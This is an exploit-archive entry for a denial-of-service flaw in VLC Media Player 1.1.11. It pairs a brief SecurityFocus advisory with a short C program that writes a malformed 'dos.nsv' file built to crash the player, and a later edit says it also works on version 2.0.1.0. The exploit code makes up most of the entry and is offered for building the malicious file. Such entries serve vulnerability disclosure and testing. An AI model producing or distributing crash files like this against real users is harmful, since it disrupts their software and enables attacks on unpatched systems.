source: http://www.securityfocus.com/bid/64623/info

VLC Media Player is prone to a denial-of-service vulnerability.

Successful exploits may allow attackers to crash the affected application, denying service to legitimate users.

VLC Media Player 1.1.11 is vulnerable; other versions may also be affected. 

# Exploit Title: VLC v. 1.1.11 .nsv DOS
# Date: 3/14/2012
# Author: Dan Fosco
# Vendor or Software Link: www.videolan.org
# Version: 1.1.11
# Category: local
# Google dork: n/a
# Tested on: Windows XP SP3 (64-bit)
# Demo site: n/a

#include <stdio.h>

int main()
{
	FILE *f;
	f = fopen("dos.nsv", "w");
	fputs("\x4e\x53\x56\x66", f);
	fputc('\x00', f);
	fputc('\x00', f);
	fputc('\x00', f);
	fputc('\x00', f);
	fclose(f);
	return 0;
}

//use code for creating malicious file

edit:  works on 2.0.1.0


